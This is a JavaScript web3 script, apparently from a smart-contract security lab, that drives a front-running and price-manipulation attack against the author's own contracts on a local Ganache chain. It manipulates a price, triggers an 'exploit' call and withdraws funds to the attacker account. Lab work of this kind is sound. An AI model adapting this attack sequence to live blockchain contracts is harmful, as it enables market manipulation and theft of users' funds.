const { Web3 } = require('web3'); //Import web3 library

//connection to Ganache
const web3 = new Web3('http://localhost:7545'); 

//contract addresses (I will update after each deployment)
const FrontRunningContractAddress = '0x5dD9072e459378aa6DB0bE4A4f0B899c8C294801';
const AttackingContractAddress = '0xc3eCC7889059994f00A0e882E0ccFF776e8ff4f2';

//getting artifacts (ABI, bytecode, etc,.)
const FrontRunningContractArtifact = require('../build/contracts/FrontRunningContract.json');
const AttackingContractArtifact = require('../build/contracts/AttackingContract.json');

//creating instances with the used of the ABIs
const FrontRunningContract = new web3.eth.Contract(FrontRunningContractArtifact.abi, FrontRunningContractAddress);
const AttackingContract = new web3.eth.Contract(AttackingContractArtifact.abi, AttackingContractAddress);

//initial price manipulation
const manipulatePrice = async (price) => {
    try {
        const accounts = await web3.eth.getAccounts(); //get accounts (as seen in DoS script)
        const tx = await FrontRunningContract.methods.manipulatePrice(price).send({ from: accounts[0] }); //initial manipulating price
        console.log('Price changed to', price, 'ether');
        console.log('Transaction hash:', tx.transactionHash);
    } catch (error) {
        console.error('Error changing price:', error);
    }
};

//exploitation of function
const exploit = async (price) => {
    try {
        const accounts = await web3.eth.getAccounts(); //get accounts
        const tx = await AttackingContract.methods.exploit(price).send({ from: accounts[1], value: web3.utils.toWei(price + '', 'ether') }); //using price exploitation from attacking contract
        console.log('Manipulation successful with the price of:', price, 'ether');
        console.log('Transaction hash:', tx.transactionHash);
    } catch (error) {
        console.error('Error manipulating:', error);
    }
};

//funding withdrawal after attack
const withdrawFunds = async () => {
    try {
        const accounts = await web3.eth.getAccounts();
        const owner = accounts[0];
        const tx = await AttackingContract.methods.withdraw().send({ from: owner }); //withdraw function from attacking contract
        console.log('Funds withdrawn from the attacking contract');
        console.log('Transaction hash:', tx.transactionHash);
    } catch (error) {
        console.error('Error withdrawing funds:', error);
    }
};

//executing intended actions
async function main() {
    await manipulatePrice(2);
    await exploit(2);
    await withdrawFunds();
}

//error handling for script error
main().catch((error) => {
    console.error('Error running script:', error);
});